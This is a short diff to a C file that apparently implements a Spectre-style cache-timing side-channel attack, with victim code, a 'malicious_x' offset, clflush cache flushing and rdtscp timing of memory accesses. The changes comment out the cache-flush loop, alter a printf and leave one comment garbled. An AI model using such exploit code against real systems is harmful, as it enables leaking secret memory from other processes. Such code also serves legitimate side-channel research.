@@ -9,7 +9,7 @@
 #else
 #include <x86intrin.h> /* for rdtscp and clflush */
 #endif
-
+#include <inttypes.h>
 
 /********************************************************************
 Victim code.
@@ -65,11 +65,11 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   for (tries = 999; tries > 0; tries--) {
 
     /* Flush big array[4096*(0..255)] from cache */
-    for (i = 0; i < 4096; i++)
-      _mm_clflush( & bigArray[i * 512]); /* intrinsic for clflush instruction */
+   // for (i = 0; i < 4096; i++)
+     // _mm_clflush( & bigArray[i * 512]); /* intrinsic for clflush instruction */
 
-
-    /* Call the victim! */
+        
+    /* Call t   victim! */
     victim_function(); //store in big[0]
 
    
@@ -77,7 +77,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     time1 = __rdtscp( & junk); /* READ TIMER */
     junk = * addr; /* MEMORY ACCESS TO TIME */
     time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-    printf("time of accessing 1 is %ld", long(time2));
+    printf("%" PRId64 "\n", time2);
+
 
 
   }
